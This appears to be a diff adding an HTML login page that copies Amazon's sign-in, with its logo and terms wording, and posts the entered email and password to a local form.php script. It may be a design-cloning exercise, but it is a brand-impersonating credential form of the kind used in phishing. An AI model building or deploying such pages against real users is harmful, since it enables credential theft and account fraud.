@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <style>
+        * {
+            font-family: sans-serif;
+        }
+        .container{
+            
+            padding: 800px;
+            padding-top: 20px;
+        }
+
+        .outside-box {
+            display: inline-block;
+
+        }
+
+        .no-underline {
+            text-decoration: none;
+
+        }
+
+        .no-underline:hover {
+            text-decoration: underline;
+        }
+
+        .login-box {
+            border: 1px solid rgb(199, 197, 197);
+            display: inline-block;
+            height: 358.59px;
+            width: 348px;
+            padding: 10px;
+            border-radius: 10px;
+
+        }
+
+    
+        .login-button:hover{
+        background-color: #f3e523b2;
+        }
+
+        .inner-box {
+            margin: 20px 26px;
+        }
+
+        .login-button {
+            border-radius: 5px;
+            border: none;
+            background-color: #f3e523;
+            box-shadow: 0 0 3px rgba(0,0,0,0.3);
+
+
+
+
+        }
+
+        input {
+            line-height: 25px;
+            border-radius: 5px;
+            border-width: 1px;
+            width: 100%;
+        }
+
+        
+
+        label {
+            font-weight: bold;
+
+        }
+
+        .login {
+            font-size: 30px;
+            margin: 15px 0px;
+
+
+
+        }
+
+        .font-size {
+            font-size: 13px;
+        }
+
+        .hyperlink-blue {
+            color: rgb(49, 139, 212);
+        }
+
+        .hyperlink-black {
+            color: black;
+        }
+
+        .new-account {
+            border-radius: 5px;
+            border: none;
+            height: 27px;
+            width: 100%;
+            /* border: 1px solid rgb(199, 197, 197); */
+            background-color: white;
+            box-shadow: 0 0 3px rgba(0,0,0,0.3);
+
+
+        }
+
+        .new-account:hover{
+        background-color: #f7f9fd;
+        }
+
+        hr{
+             border-color:rgba(245, 242, 242, 0.459);
+        }
+
+        .logo{
+            height: 35px;
+            padding-left: 100px;
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<div class="container">
+    
+    <div class="outside-box">
+        <img class="logo"  src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1280px-Amazon_logo.svg.png" alt="">
+        <div class="login-box">
+            <div class="inner-box">
+                <p class="login">Login</p>
+                <form action="http://localhost/form.php" method="POST">
+                    <label for="" class="font-size">Email</label><br>
+                    <input type="text" size="30px " autofocus required autocomplete="on" placeholder="example@gmail.com" name="username">
+
+                    <br><br>
+
+                    <label for="" class="font-size" >Password</label><br>
+                    <input type="password" autofocus required size="30px" name="password">
+
+                    <br><br>
+
+                    <input type="submit" value="Login" class="login-button">
+
+                </form>
+                <p style="font-size: 12px;">By continuing, you agree to Amazon's
+                    <a href="">Conditions of Use</a> and
+                    <a href="">Privacy Notice</a>.
+                </p>
+
+                <hr class="hr">
+
+
+                <a href="" class="no-underline font-size hyperlink-blue">Need help</a>
+                <a href="./login.html" class="font-size margin no-underline" style="margin-left: 190px;">Cancel</a>
+
+            </div>
+
+        </div>
+        <hr class="hr" style="margin-top: 25px; margin-bottom: 25px;">
+
+        <button class="new-account"><a href="./signup.html" class="hyperlink-black" style="text-decoration: none;">Create a new account</a></button>
+
+
+    </div>
+</div>
+
+</body>
+
+</html>
